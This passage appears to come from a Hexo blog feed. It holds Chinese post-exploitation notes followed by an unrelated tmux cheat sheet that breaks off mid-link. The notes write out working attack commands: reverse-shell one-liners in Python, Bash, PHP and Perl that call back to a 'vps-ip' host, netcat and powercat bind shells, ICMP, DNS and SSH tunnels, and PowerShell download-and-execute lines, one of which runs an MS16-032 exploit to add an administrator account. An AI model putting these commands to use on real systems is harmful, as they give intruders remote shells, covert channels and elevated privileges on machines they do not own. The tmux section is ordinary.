id="1-10-2-利用telnet命令扫描-telnet-lt-ip-gt-lt-port-gt"><a href="#1-10-2-利用telnet命令扫描-telnet-lt-ip-gt-lt-port-gt" class="headerlink" title="1.10.2. 利用telnet命令扫描 telnet &lt;ip&gt; &lt;port&gt;"></a>1.10.2. 利用telnet命令扫描 <code>telnet &lt;ip&gt; &lt;port&gt;</code></h3><h3 id="1-10-3-利用msfconsole-use-auxiliary-scanner-portscan-tcp"><a href="#1-10-3-利用msfconsole-use-auxiliary-scanner-portscan-tcp" class="headerlink" title="1.10.3. 利用msfconsole  use auxiliary/scanner/portscan/tcp"></a>1.10.3. 利用msfconsole  <code>use auxiliary/scanner/portscan/tcp</code></h3><h3 id="1-10-4-利用powersploit-Invoke-Portscan"><a href="#1-10-4-利用powersploit-Invoke-Portscan" class="headerlink" title="1.10.4. 利用powersploit Invoke-Portscan"></a>1.10.4. 利用powersploit <code>Invoke-Portscan</code></h3><pre><code class="ssh">powershell.exe -nop -exec bypass -c &quot;IEX(New-object Net.webclient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/Invoke-Portscan.ps1&#39;); Invoke-Portscan -Hosts 192.168.1.0/24 -T 4 -ports &#39;445,1433,8080,3389,80&#39; -oA C:windows\tempes.txt &quot;</code></pre><h3 id="1-10-5-利用Nishang-Invoke-Portscan"><a href="#1-10-5-利用Nishang-Invoke-Portscan" class="headerlink" title="1.10.5. 利用Nishang Invoke-Portscan"></a>1.10.5. 利用Nishang <code>Invoke-Portscan</code></h3><pre><code class="ssh">Invoke-Portscan -StartAddress 192.168.1.1 -EndAddress 192.168.1.255 -ResolveHost</code></pre><h1 id="2-隐藏通信隧道技术"><a href="#2-隐藏通信隧道技术" class="headerlink" title="2. 隐藏通信隧道技术"></a>2. 隐藏通信隧道技术</h1><h2 id="2-1-基础知识"><a href="#2-1-基础知识" class="headerlink" title="2.1. 基础知识"></a>2.1. 基础知识</h2><h3 id="2-1-1-隧道-一种绕过端口屏蔽的通信方式"><a href="#2-1-1-隧道-一种绕过端口屏蔽的通信方式" class="headerlink" title="2.1.1. 隧道-一种绕过端口屏蔽的通信方式"></a>2.1.1. 隧道-一种绕过端口屏蔽的通信方式</h3><blockquote><p>攻击机发出的数据包封装成防火墙允许的数据包格式，经过防火墙允许的端口，从而穿过防火墙，与目标机进行通信。</p></blockquote><ul><li><strong>网络层</strong> ：IPv6，ICMP，GRE</li><li><strong>传输层</strong>：TCP，UDP，常规端口转发</li><li><strong>应用层</strong>：SSH，HTTP，HTTPS，DNS</li></ul><h3 id="2-1-2-内网连通性判断"><a href="#2-1-2-内网连通性判断" class="headerlink" title="2.1.2. 内网连通性判断"></a>2.1.2. 内网连通性判断</h3><blockquote><p>判断域内及其能否上外网</p><p>内网中是否有proxy server</p><ol><li>查看内网hostname=*proxy*<br><code>curl www.baidu.com //不同</code><br><code>curl -x proxy-ip:port  www.baidu.com   //通</code></li></ol></blockquote><h4 id="2-1-2-1-ICMP协议-ping-baidu-com"><a href="#2-1-2-1-ICMP协议-ping-baidu-com" class="headerlink" title="2.1.2.1. ICMP协议 ping  baidu.com"></a>2.1.2.1. ICMP协议 <code>ping  baidu.com</code></h4><h4 id="2-1-2-2-TCP协议-nc-zv-lt-target-gt-lt-port-gt"><a href="#2-1-2-2-TCP协议-nc-zv-lt-target-gt-lt-port-gt" class="headerlink" title="2.1.2.2. TCP协议 nc -zv &lt;target&gt;  &lt;port&gt;"></a>2.1.2.2. TCP协议 <code>nc -zv &lt;target&gt;  &lt;port&gt;</code></h4><h4 id="2-1-2-3-HTTP-S-协议-curl-lt-target-gt-lt-port-gt"><a href="#2-1-2-3-HTTP-S-协议-curl-lt-target-gt-lt-port-gt" class="headerlink" title="2.1.2.3. HTTP(S)协议 curl &lt;target&gt;:&lt;port&gt;"></a>2.1.2.3. HTTP(S)协议 <code>curl &lt;target&gt;:&lt;port&gt;</code></h4><h4 id="2-1-2-4-DNS协议-dig-vps-ip-www-baidu-com-A"><a href="#2-1-2-4-DNS协议-dig-vps-ip-www-baidu-com-A" class="headerlink" title="2.1.2.4. DNS协议 dig @vps-ip www.baidu.com A"></a>2.1.2.4. DNS协议 <code>dig @vps-ip www.baidu.com A</code></h4><blockquote><p>windows : <code>nslookup www.baidu.com vips-ip</code></p></blockquote><h2 id="2-2-网络层层隧道技术"><a href="#2-2-网络层层隧道技术" class="headerlink" title="2.2. 网络层层隧道技术"></a>2.2. 网络层层隧道技术</h2><h3 id="2-2-1-IPv6隧道-socat，6tunnel，nt6tunnel"><a href="#2-2-1-IPv6隧道-socat，6tunnel，nt6tunnel" class="headerlink" title="2.2.1. IPv6隧道-socat，6tunnel，nt6tunnel"></a>2.2.1. IPv6隧道-socat，6tunnel，nt6tunnel</h3><blockquote><p>将IPv6数据报文封装在IPv4数据报文中</p></blockquote><h3 id="2-2-2-ICMP隧道-icmpsh-pingTunnel-icmptunnel-powershell-icmp"><a href="#2-2-2-ICMP隧道-icmpsh-pingTunnel-icmptunnel-powershell-icmp" class="headerlink" title="2.2.2. ICMP隧道-icmpsh,pingTunnel,icmptunnel,powershell icmp"></a>2.2.2. ICMP隧道-icmpsh,pingTunnel,icmptunnel,powershell icmp</h3><blockquote><p>将TCP/UDP数据包封装到ICMP的ping数据包中，从而穿过防火墙，实现不受限制的网络访问</p></blockquote><h4 id="2-2-2-1-icmpsh"><a href="#2-2-2-1-icmpsh" class="headerlink" title="2.2.2.1. icmpsh"></a>2.2.2.1. <a href="https://github.com/inquisb/icmpsh">icmpsh</a></h4><pre><code class="ssh">    target:           icmpsh.exe -t kali-ip  -d 500 -b 30 -s 128    kali:    apt install python-impacket    git clone https://github.cominquisb/icmpsh.git /opt/icmpsh    sysctl -w net.ipv4_icmp_echo_ignore_all=1    ./run.sh</code></pre><h4 id="2-2-2-2-PingTunnel"><a href="#2-2-2-2-PingTunnel" class="headerlink" title="2.2.2.2. PingTunnel"></a>2.2.2.2. <a href="http://www.cs.uit.no/~daniels/PingTunnel/PingTunnel-0.72.tar.gz">PingTunnel</a></h4><blockquote><p><a href="http://www.cs.uit.no/~daniels/PingTunnel/index.html">http://www.cs.uit.no/~daniels/PingTunnel/index.html</a></p></blockquote><pre><code class="ssh">    kali:192.168.10        web server:192.168.1.4   /1.1.1.x    sql server:1.1.1.10kali:ptunnel -p 192.168.1.4 -lp 1080 -da 1.1.1.10 -dp 3389</code></pre><h2 id="2-3-传输层隧道技术"><a href="#2-3-传输层隧道技术" class="headerlink" title="2.3. 传输层隧道技术"></a>2.3. 传输层隧道技术</h2><h3 id="2-3-1-Socket隧道：LCX-portmap端口转发"><a href="#2-3-1-Socket隧道：LCX-portmap端口转发" class="headerlink" title="2.3.1. Socket隧道：LCX/portmap端口转发"></a>2.3.1. Socket隧道：LCX/portmap端口转发</h3><pre><code class="ssh">&gt;端口转发target: lcx.exe -slave vps-ip 4444 127.0.0.1 3389 //将本机3389端口所有数据转发到vps-ip上的4444端口vps-ip: lcx.exe -listen 4444 5555   //将本地4444端口监听的数据转发到5555端口        mstsc //127.0.0.1:5555-&gt;target:3389&gt;本地端口映射target: lcx.exe -tran 53 127.0.0.1 3389 //防火墙禁止3389后，可将3389端口数据转发到本地53端口</code></pre><h3 id="2-3-2-Netcat"><a href="#2-3-2-Netcat" class="headerlink" title="2.3.2. Netcat"></a>2.3.2. Netcat</h3><h4 id="2-3-2-1-常见使用场景"><a href="#2-3-2-1-常见使用场景" class="headerlink" title="2.3.2.1. 常见使用场景"></a>2.3.2.1. 常见使用场景</h4><blockquote><p>banner获取 <code>nc -nv  ip  port </code><br>连接主机<code>nc -nvv  ip  port </code><br>扫描端口<code>nc -v -z  ip  port1-port2</code><br>监听端口<code>nc -l -p 9999</code><br>简易聊天室</p><ul><li>服务端：<code>nc -lp 8888</code> </li><li>客户器：<code>nc -nv  &lt;client-ip&gt; 8888</code><br>文件传输</li><li>接收方 ：<code>nc -lp 8888 &gt; 1.txt</code>      //192.168.1.1</li><li>发送方：<code>nc -nv 192.168.1.1 8888 &lt; test.txt -q 1</code></li></ul></blockquote><h4 id="2-3-2-2-获取shell"><a href="#2-3-2-2-获取shell" class="headerlink" title="2.3.2.2. 获取shell"></a>2.3.2.2. 获取shell</h4><pre><code class="ssh">&gt;正向shell:    客户端       ----&gt;    服务器的shell  //客户端获取服务器的shell客户端(192.168.1.114):        nc 10.10.10.115 4444服务器(10.10.10.115):     nc -lvp 4444 -e /bin/sh    //linux     nc -lvp 4444 -e c:\windows\system32\cmd.exe  //windows&gt;反向shell：  客户端的shell &lt;----    服务器       //服务器获取客户端的shell服务器(10.10.10.115)：    nc -lvp 9999客户端(192.168.1.114):    nc 10.10.10.115 9999 -e /bin/sh  //linux    nc 10.10.10.115 9999 -e c:\windows\system32\cmd.exe   //windows</code></pre><h4 id="2-3-2-3-获取反向shell"><a href="#2-3-2-3-获取反向shell" class="headerlink" title="2.3.2.3. 获取反向shell"></a>2.3.2.3. 获取反向shell</h4><pre><code class="ssh">vps: nc -lvp 2222&gt;-----python反向shell-------python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&quot;vps-ip&quot;,2222));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);&#39;&gt;-----------Bash反向shell---------bash -i &gt;&amp; /dev/tcp/vps-ip/4444 0&gt;&amp;1&gt;-----------PHP反向shell---------php -r &#39;$sock=fsockopen(&quot;vps-ip&quot;,2222);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);&#39;&gt;----------Perl反向shell--------perl -e &#39;use Socket;$i=&quot;192.168.1.117&quot;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&quot;tcp&quot;));if(connect(S,sockaddr_in($p,inet_aton($i))))&#123;    open(STDIN,&quot;&gt;&amp;S&quot;);    open(STDOUT,&quot;&gt;&amp;S&quot;);    open(STDERR,&quot;&gt;&amp;S&quot;);    exec(&quot;/bin/sh -i&quot;);    &#125;;&#39;&gt;</code></pre><h4 id="2-3-2-4-Netcat内网代理"><a href="#2-3-2-4-Netcat内网代理" class="headerlink" title="2.3.2.4. Netcat内网代理"></a>2.3.2.4. Netcat内网代理</h4><pre><code class="ssh">---------------------------------------------------------------VPS(192.168.1.4)            Web Server(192.168.1.1/1.1.1.116)                            MySQL Server(1.1.1.200)----------------------------------------------------------------step1:vps: nc -lvp 3333step2:MySQL:nc -lvp 3333 -e /bin/shstep3:Web  :nc -v 192.168.1.4 3333 -c &quot;nc -v 1.1.1.200 3333&quot;&gt;</code></pre><h3 id="2-3-3-PowerCat"><a href="#2-3-3-PowerCat" class="headerlink" title="2.3.3. PowerCat"></a>2.3.3. <a href="https://github.com/besimorhino/powercat.git">PowerCat</a></h3><blockquote><p>nc的powershell版本</p></blockquote><h4 id="2-3-3-1-powercat常用操作"><a href="#2-3-3-1-powercat常用操作" class="headerlink" title="2.3.3.1. powercat常用操作"></a>2.3.3.1. powercat常用操作</h4><pre><code class="ssh">#powercat正向shellwin10(192.168.1.119):    powercat -l -p 8888 -e cmd.exe -v kali(192.168.1.119):      nc 192.168.1.119 8888-------------------------------#powercat反弹shellwin10(192.168.1.119):    powercat -c 192.168.1.119 -p 8888 -v -e cmd.exekali(192.168.1.119):     nc -lvp 8888--------------------------------------#返回powershellpowercat -c vps -p 9999 -v -ep -----------------------------#传输文件powercat -l -p 8888 -of test.txt -v powercat -c vps 8888 -i c:\test.txt -v -----------------------------#生成payloadpowercat -l -p 8888 -e cmd -v -ge &gt;&gt;shell.ps1&gt;</code></pre><h4 id="2-3-3-2-powercat-DNS隧道通信"><a href="#2-3-3-2-powercat-DNS隧道通信" class="headerlink" title="2.3.3.2. powercat DNS隧道通信"></a>2.3.3.2. powercat DNS隧道通信</h4><pre><code class="ssh">kali :192.168.1.117        win10:192.168.1.119---------------------------------------kali: ruby dnscat2.rb -e open --no-cache ttpowercat.testwin10: powercat -c 192.168.1.117 -p 53 -dns ttpowercat.test -e cmd.exe</code></pre><h2 id="2-4-应用层隧道技术"><a href="#2-4-应用层隧道技术" class="headerlink" title="2.4. 应用层隧道技术"></a>2.4. 应用层隧道技术</h2><h3 id="2-4-1-SSH协议隧道"><a href="#2-4-1-SSH协议隧道" class="headerlink" title="2.4.1. SSH协议隧道"></a>2.4.1. SSH协议隧道</h3><p><a href="http://arondight.me/2016/02/17/%E4%BD%BF%E7%94%A8SSH%E5%8F%8D%E5%90%91%E9%9A%A7%E9%81%93%E8%BF%9B%E8%A1%8C%E5%86%85%E7%BD%91%E7%A9%BF%E9%80%8F/">使用SSH反向隧道进行内网穿透 </a></p><h4 id="2-4-1-1-本地端口转发"><a href="#2-4-1-1-本地端口转发" class="headerlink" title="2.4.1.1. 本地端口转发"></a>2.4.1.1. 本地端口转发</h4><pre><code class="ssh">kali: 192.168.1.117       MacBook  :192.168.1.121                          win10    :192.168.1.119 ---------------------------------------------------kali:     127.0.0.1:444  --&gt; 192.168.1.119:3389    ssh -CfNg -L 4444:192.168.1.119:3389  ethan@192.168.1.121</code></pre><h4 id="2-4-1-2-远程端口转发"><a href="#2-4-1-2-远程端口转发" class="headerlink" title="2.4.1.2. 远程端口转发"></a>2.4.1.2. 远程端口转发</h4><pre><code class="ssh">kali: 192.168.1.117       MacBook  :192.168.1.121                          win10    :192.168.1.119 ---------------------------------------------------MacBook:     192.168.1.117:4444  --&gt; 192.168.1.119:3389    ssh -CfNg -R 4444:192.168.1.119:3389  kali@192.168.1.117</code></pre><h4 id="2-4-1-3-动态端口转发（加密socks"><a href="#2-4-1-3-动态端口转发（加密socks" class="headerlink" title="2.4.1.3. 动态端口转发（加密socks)"></a>2.4.1.3. 动态端口转发（加密socks)</h4><pre><code class="ssh">kali: 192.168.1.117       MacBook  :192.168.1.121                          win10    :192.168.1.119 ---------------------------------------------------kali:     192.168.1.117:4444  --&gt; 192.168.1.119:3389    ssh -CfNg -D 4444  ethan@192.168.1.121</code></pre><h3 id="2-4-2-HTTP-HTTPS协议隧道"><a href="#2-4-2-HTTP-HTTPS协议隧道" class="headerlink" title="2.4.2. HTTP/HTTPS协议隧道"></a>2.4.2. HTTP/HTTPS协议隧道</h3><h4 id="2-4-2-1-reGeorg"><a href="#2-4-2-1-reGeorg" class="headerlink" title="2.4.2.1. reGeorg"></a>2.4.2.1. <a href="https://github.com/sensepost/reGeorg.git">reGeorg</a></h4><pre><code class="ssh">python reGeorgSocksProxy.py -p 8080 -u http://upload.sensepost.net:8080/tunnel/tunnel.jsp</code></pre><h4 id="2-4-2-2-proxytunnel"><a href="#2-4-2-2-proxytunnel" class="headerlink" title="2.4.2.2. proxytunnel"></a>2.4.2.2. <a href="https://github.com/proxytunnel/proxytunnel.git">proxytunnel</a></h4><h3 id="2-4-3-DNS协议隧道"><a href="#2-4-3-DNS协议隧道" class="headerlink" title="2.4.3. DNS协议隧道"></a>2.4.3. DNS协议隧道</h3><h4 id="2-4-3-1-Dnscat2"><a href="#2-4-3-1-Dnscat2" class="headerlink" title="2.4.3.1. Dnscat2"></a>2.4.3.1. <a href="https://github.com/iagox86/dnscat2.git">Dnscat2</a></h4><h4 id="2-4-3-2-iodine"><a href="#2-4-3-2-iodine" class="headerlink" title="2.4.3.2. iodine"></a>2.4.3.2. <a href="https://github.com/yarrick/iodine.git">iodine</a></h4><h2 id="2-5-SOCKS代理"><a href="#2-5-SOCKS代理" class="headerlink" title="2.5. SOCKS代理"></a>2.5. SOCKS代理</h2><blockquote><p>Socket隧道具备2端<br>服务端：监听一个端口，等待客户端连接<br>客户端：传入服务端IP地址和端口，才能主动与服务器连接</p></blockquote><h3 id="2-5-1-Proxychains"><a href="#2-5-1-Proxychains" class="headerlink" title="2.5.1. Proxychains"></a>2.5.1. <a href="http://proxychains.sourceforge.net/">Proxychains</a></h3><h3 id="2-5-2-SocksCap64"><a href="#2-5-2-SocksCap64" class="headerlink" title="2.5.2. SocksCap64"></a>2.5.2. <a href="https://www.sockscap64.com/">SocksCap64</a></h3><h3 id="2-5-3-Proxifier"><a href="#2-5-3-Proxifier" class="headerlink" title="2.5.3. Proxifier"></a>2.5.3. <a href="https://www.proxifier.com/">Proxifier</a></h3><h3 id="2-5-4-EarthWorm"><a href="#2-5-4-EarthWorm" class="headerlink" title="2.5.4. EarthWorm"></a>2.5.4. <a href="https://github.com/rootkiter/EarthWorm.git">EarthWorm</a></h3><h3 id="2-5-5-Termite"><a href="#2-5-5-Termite" class="headerlink" title="2.5.5. Termite"></a>2.5.5. <a href="https://github.com/rootkiter/Termite.git">Termite</a></h3><h3 id="2-5-6-reGeorg"><a href="#2-5-6-reGeorg" class="headerlink" title="2.5.6. reGeorg"></a>2.5.6. <a href="https://github.com/sensepost/reGeorg.git">reGeorg</a></h3><h2 id="2-6-数据通信"><a href="#2-6-数据通信" class="headerlink" title="2.6. 数据通信"></a>2.6. 数据通信</h2><h3 id="2-6-1-压缩数据"><a href="#2-6-1-压缩数据" class="headerlink" title="2.6.1. 压缩数据"></a>2.6.1. 压缩数据</h3><p><a href="https://www.7-zip.org/">7zip</a></p><pre><code class="ssh">&gt;压缩文件：7z.exe  a -r -p12345 E:\path\to\file.7z   C:\path\to\file\&gt;解压文件：&gt;7z.exe x -p12345  E:\path\to\file.7z -o E:\x</code></pre><h3 id="2-6-2-传输数据"><a href="#2-6-2-传输数据" class="headerlink" title="2.6.2. 传输数据"></a>2.6.2. 传输数据</h3><blockquote><p><a href="https://mp.weixin.qq.com/s/tINvBuhiZwz7MbA_sffapA">https://mp.weixin.qq.com/s/tINvBuhiZwz7MbA_sffapA</a></p></blockquote><h3 id="2-6-3-利用FTP协议"><a href="#2-6-3-利用FTP协议" class="headerlink" title="2.6.3. 利用FTP协议"></a>2.6.3. 利用FTP协议</h3><h3 id="2-6-4-利用Debug上传"><a href="#2-6-4-利用Debug上传" class="headerlink" title="2.6.4. 利用Debug上传"></a>2.6.4. 利用Debug上传</h3><h3 id="2-6-5-利用Nishang上传-download-execute"><a href="#2-6-5-利用Nishang上传-download-execute" class="headerlink" title="2.6.5. 利用Nishang上传-download-execute"></a>2.6.5. 利用Nishang上传-download-execute</h3><h3 id="2-6-6-利用bitsadmin下载"><a href="#2-6-6-利用bitsadmin下载" class="headerlink" title="2.6.6. 利用bitsadmin下载"></a>2.6.6. 利用bitsadmin下载</h3><h3 id="2-6-7-利用powershell下载"><a href="#2-6-7-利用powershell下载" class="headerlink" title="2.6.7. 利用powershell下载"></a>2.6.7. 利用powershell下载</h3><h1 id="3-Windows权限提升分析及防御"><a href="#3-Windows权限提升分析及防御" class="headerlink" title="3. Windows权限提升分析及防御"></a>3. Windows权限提升分析及防御</h1><h2 id="3-1-系统内核溢出漏洞提权分析及防范"><a href="#3-1-系统内核溢出漏洞提权分析及防范" class="headerlink" title="3.1. 系统内核溢出漏洞提权分析及防范"></a>3.1. 系统内核溢出漏洞提权分析及防范</h2><p><a href="https://github.com/SecWiki/windows-kernel-exploits.git">Windows Exploit Suggester</a></p><h3 id="3-1-1-MS16-032提权-KB3139914"><a href="#3-1-1-MS16-032提权-KB3139914" class="headerlink" title="3.1.1. MS16-032提权-KB3139914"></a>3.1.1. MS16-032提权-KB3139914</h3><pre><code class="ssh">powershell.exe -nop -exec bypass -c &quot;IEX (New-Object Net.Webclient).DownloadString(&quot;https://raw.githubusercontent.com/Ridter/Pentest/master/powershell/MyShell/Invoke-MS16-032.ps1&quot;);Invoke-MS16-032 -Application cmd.exe -Commandline &#39;/c net admins 12345 /add&#39; &quot;</code></pre><h2 id="3-2-windows操作系统配置错误利用分析及防范"><a href="#3-2-windows操作系统配置错误利用分析及防范" class="headerlink" title="3.2. windows操作系统配置错误利用分析及防范"></a>3.2. windows操作系统配置错误利用分析及防范</h2><h3 id="3-2-1-注册表键AlwaysInstallElevated"><a href="#3-2-1-注册表键AlwaysInstallElevated" class="headerlink" title="3.2.1. 注册表键AlwaysInstallElevated"></a>3.2.1. 注册表键AlwaysInstallElevated</h3><blockquote><p>gpedit.msc &gt;windows Installer-永远以高权限进行安装</p></blockquote><h3 id="3-2-2-可信任服务路径漏洞"><a href="#3-2-2-可信任服务路径漏洞" class="headerlink" title="3.2.2. 可信任服务路径漏洞"></a>3.2.2. 可信任服务路径漏洞</h3><blockquote><p>一个服务的可执行文件的路径没有被双引号引起来，且包含空格，则存在此漏洞</p><ul><li>若路径与服务有关，则创建一个服务或编译service模版</li><li>若路径与可执行文件有关，则创建一个可执行文件</li></ul></blockquote><h2 id="3-3-组策略首选项提权分析及防范"><a href="#3-3-组策略首选项提权分析及防范" class="headerlink" title="3.3. 组策略首选项提权分析及防范"></a>3.3. 组策略首选项提权分析及防范</h2><h2 id="3-4-绕过UAC提权分析及防范"><a href="#3-4-绕过UAC提权分析及防范" class="headerlink" title="3.4. 绕过UAC提权分析及防范"></a>3.4. 绕过UAC提权分析及防范</h2><h2 id="3-5-令牌窃取分析及防范"><a href="#3-5-令牌窃取分析及防范" class="headerlink" title="3.5. 令牌窃取分析及防范"></a>3.5. 令牌窃取分析及防范</h2><h2 id="3-6-无凭证条件下的权限分析及防范"><a href="#3-6-无凭证条件下的权限分析及防范" class="headerlink" title="3.6. 无凭证条件下的权限分析及防范"></a>3.6. 无凭证条件下的权限分析及防范</h2><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kity@2.0.4/dist/kity.min.js"></script><script type="text/javascript" src="https://cdn.jsdelivr.net/npm/kityminder-core@1.4.50/dist/kityminder.core.min.js"></script><script defer="true" type="text/javascript" src="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.js"></script><link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/npm/hexo-simple-mindmap@0.2.0/dist/mindmap.min.css">]]></content>
      
      
      <categories>
          
          <category> Kali </category>
          
          <category> PostExploit </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Tmux</title>
      <link href="Tools/Tmux.html"/>
      <url>Tools/Tmux.html</url>
      
        <content type="html"><![CDATA[<p><img src="../images/tmux-1.gif" alt="tmux-1"></p><h2 id="Installation"><a href="#Installation" class="headerlink" title="Installation"></a>Installation</h2><pre><code>$ cd$ git clone https://github.com/gpakosz/.tmux.git$ ln -s -f .tmux/.tmux.conf$ cp .tmux/.tmux.conf.local .</code></pre><h2 id="Key-Bindings"><a href="#Key-Bindings" class="headerlink" title="Key-Bindings"></a>Key-Bindings</h2><ul><li><code>&lt;prefix&gt;</code> <kbd>Ctrl</kbd> + <kbd>a</kbd> or <kbd>Ctrl</kbd> + <kbd>b</kbd></li><li><code>&lt;prefix&gt; c</code>  <kbd>Ctrl</kbd> + <kbd>a</kbd> + <kbd>c</kbd></li><li><code>&lt;prefix&gt; C-c</code>  <kbd>Ctrl</kbd> + <kbd>a</kbd>  + <kbd>Ctrl</kbd> + <kbd>c</kbd></li><li><code>&lt;prefix&gt; ?</code> manual </li><li><code>&lt;prefix&gt; d</code> detached the current session</li><li><code>&lt;ctrl&gt; +d</code> kill current session</li><li><code>&lt;prefix&gt; d</code> close current panel</li></ul><p>This configuration uses the following bindings:</p><ul><li><code>&lt;prefix&gt; e</code> opens <code>~/.tmux.conf.local</code></li><li><code>&lt;prefix&gt; r</code> reloads <code>~/.tmux.conf.local</code></li><li><code>C-l</code> clears both the screen and the tmux history</li></ul><h3 id="Session-Operation"><a href="#Session-Operation" class="headerlink" title="Session Operation:"></a>Session Operation:</h3><ul><li><code>&lt;prefix&gt; C-c</code> creates a new session</li><li><code>&lt;prefix&gt; C-f</code> lets you switch to another session by name</li><li><code>&lt;prefix&gt; $</code> rename session name</li><li><code>&lt;prefix&gt; s</code> list sessions</li></ul><h3 id="Windows-Operation"><a href="#Windows-Operation" class="headerlink" title="Windows Operation:"></a>Windows Operation:</h3><ul><li><code>&lt;prefix&gt; C-h</code> and <code>&lt;prefix&gt; C-l</code> let you navigate windows </li><li><code>&lt;prefix&gt; c</code> create window</li><li><code>&lt;prefix&gt; w</code> list windows </li><li><code>&lt;prefix&gt; Tab</code> brings you to the last active window</li><li><code>&lt;prefix&gt; 1,2,3</code> let you navigate to specific window</li><li><code>&lt;prefix&gt; ,</code> rename current window</li><li><code>&lt;prefix&gt; &amp;</code> close current window</li><li><code>&lt;prefix&gt; f</code> find specific window by name</li></ul><h3 id="Panel-Operation"><a href="#Panel-Operation" class="headerlink" title="Panel Operation:"></a>Panel Operation:</h3><ul><li><p><code>&lt;prefix&gt; /</code> splits the current pane vertically</p></li><li><p><code>&lt;prefix&gt; -</code> splits the current pane horizontally</p></li><li><p><code>&lt;prefix&gt; h</code>, <code>&lt;prefix&gt; j</code>, <code>&lt;prefix&gt; k</code> and <code>&lt;prefix&gt; l</code> let you navigate</p></li><li><p><code>&lt;prefix&gt; o</code> navigate panels</p></li><li><p><code>&lt;prefix&gt; H</code>, <code>&lt;prefix&gt; J</code>, <code>&lt;prefix&gt; K</code>, <code>&lt;prefix&gt; L</code> let you resize panes</p></li><li><p><code>&lt;prefix&gt; &lt;</code> and <code>&lt;prefix&gt; &gt;</code> let you swap panes</p></li><li><p><code>&lt;prefix&gt; +</code> maximizes the current pane to a new panel</p></li><li><p><code>&lt;prefix&gt; x</code> kill the current panel</p></li><li><p><code>&lt;prefix&gt; m</code> toggles mouse mode on or off</p></li><li><p><code>&lt;prefix&gt; &lt;space&gt; </code> 切换窗格布局</p></li><li><p><code>&lt;prefix&gt; Enter</code> enters copy-mode</p></li><li><p><code>&lt;prefix&gt; b</code> lists the paste-buffers</p></li><li><p><code>&lt;prefix&gt; p</code> pastes from the top paste-buffer</p></li><li><p><code>&lt;prefix&gt; P</code> lets you choose the paste-buffer to paste from</p></li></ul><h2 id="Configuration"><a href="#Configuration" class="headerlink" title="Configuration"></a>Configuration</h2><hr><p>file: <code>~/.tmux.conf.local</code><br>variables:</p><pre><code>tmux_conf_theme_left_separator_main=&#39;\uE0B0&#39;tmux_conf_theme_left_separator_sub=&#39;\uE0B1&#39;tmux_conf_theme_right_separator_main=&#39;\uE0B2&#39;tmux_conf_theme_right_separator_sub=&#39;\uE0B3&#39;</code></pre><h3 id="Configuring-the-status-line"><a href="#Configuring-the-status-line" class="headerlink" title="Configuring the status line"></a>Configuring the status line</h3><p>Edit the <code>~/.tmux.conf.local</code> file (<code>&lt;prefix&gt; e</code>) and adjust the<br><code>tmux_conf_theme_status_left</code> and <code>tmux_conf_theme_status_right</code> variables to<br>your own preferences.</p><p>This configuration supports the following builtin variables:</p><ul><li><code>#&#123;battery_bar&#125;</code>: horizontal battery charge bar</li><li><code>#&#123;battery_percentage&#125;</code>: battery percentage</li><li><code>#&#123;battery_status&#125;</code>: is battery charging or discharging?</li><li><code>#&#123;battery_vbar&#125;</code>: vertical battery charge bar</li><li><code>#&#123;circled_session_name&#125;</code>: circled session number, up to 20</li><li><code>#&#123;hostname&#125;</code>: SSH/Mosh aware hostname information</li><li><code>#&#123;hostname_ssh&#125;</code>: SSH/Mosh aware hostname information, blank when not<br>connected to a remote server through SSH/Mosh</li><li><code>#&#123;loadavg&#125;</code>: load average</li><li><code>#&#123;pairing&#125;</code>: is session attached to more than one client?</li><li><code>#&#123;prefix&#125;</code>: is prefix being depressed?</li><li><code>#&#123;root&#125;</code>: is current user root?</li><li><code>#&#123;synchronized&#125;</code>: are the panes synchronized?</li><li><code>#&#123;uptime_y&#125;</code>: uptime years</li><li><code>#&#123;uptime_d&#125;</code>: uptime days, modulo 365 when <code>#&#123;uptime_y&#125;</code> is used</li><li><code>#&#123;uptime_h&#125;</code>: uptime hours</li><li><code>#&#123;uptime_m&#125;</code>: uptime minutes</li><li><code>#&#123;uptime_s&#125;</code>: uptime seconds</li><li><code>#&#123;username&#125;</code>: SSH/Mosh aware username information</li><li><code>#&#123;username_ssh&#125;</code>: SSH aware username information, blank when not connected<br>to a remote server through SSH/Mosh</li></ul><p>Beside custom variables mentioned above, the <code>tmux_conf_theme_status_left</code> and<br><code>tmux_conf_theme_status_right</code> variables support usual tmux syntax, e.g. using<br><code>#()</code> to call an external command that inserts weather information provided by<br><a href="https://github.com/chubin/wttr.in#one-line-output">wttr.in</a>:</p><pre><code>tmux_conf_theme_status_right=&#39;#&#123;prefix&#125;#&#123;pairing&#125;#&#123;synchronized&#125; #(curl wttr.in?format=3) , %R , %d %b | #&#123;username&#125;#&#123;root&#125; | #&#123;hostname&#125; &#39;</code></pre><p><img src="../images/tmux-2.png" alt="tmux-2"></p><h3 id="Accessing-the-macOS-clipboard-from-within-tmux-sessions"><a href="#Accessing-the-macOS-clipboard-from-within-tmux-sessions" class="headerlink" title="Accessing the macOS clipboard from within tmux sessions"></a>Accessing the macOS clipboard from within tmux sessions</h3><p>[Chris Johnsen created the <code>reattach-to-user-namespace</code><br>utility][reattach-to-user-namespace] that makes <code>pbcopy</code> and <code>pbpaste</code> work<br>again within tmux.</p><p>To install <code>reattach-to-user-namespace</code>, use either <a href="http://www.macports.org/">MacPorts</a> or<br><a href="http://brew.sh/">Homebrew</a>:</p><p>   <code> $ port install tmux-pasteboard</code></p><p>or</p><pre><code>`$ brew install reattach-to-user-namespace`</code></pre><p>Once installed, <code>reattach-to-usernamespace</code> will be automatically detected.</p><p><a href="https://www.cnblogs.com/kevingrace/p/6496899.html">tmux终端复用神器</a><br><a href="https://gist.github.com/ryerh/14b7c24dfd623ef8edc7">Tmux 快捷键</a><br><a href="https://segmentfault.com/a/1190000016283278">多窗口管理器Tmux - 从入门到精通</a><br><a href="https://harttle.land/2015/11/06/tmux-startup.html">优雅地使用命令行：Tmux 终端复用 </a><br>[<a 